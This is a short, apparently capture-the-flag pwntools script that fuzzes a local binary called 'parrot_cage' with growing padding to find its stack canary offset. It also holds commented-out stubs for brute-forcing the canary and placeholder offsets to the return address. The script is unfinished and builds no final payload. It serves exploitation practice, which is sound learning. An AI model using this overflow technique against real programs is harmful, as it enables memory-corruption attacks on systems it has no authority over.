from pwn import *
import time


#OFFSET_TO_CANARY = ???
#OFFSET_TO_RIP = ???
elf = ELF('./parrot_cage', checksec=False)
#known = b"\x00"
#for i in range(7):
for canaryOff in range(64,512):
   # guess = known + bytes([bval])
    payload = b"A" * canaryOff
    io = process(elf.path)

    io.send(payload)
    io.send(b"\n")
    io.send(b"bye\n")
    try:
        data = io.recv(timeout=0.2)
        io.close()
        if b"stack smashing detected" in data:
            log.info(f"Canary offset is: {canaryOff-1}")
            OFFSET_TO_CANARY = canaryOff-1
            break
    except EOFError:
        data = b""
        io.close()

io.interactive()
                   
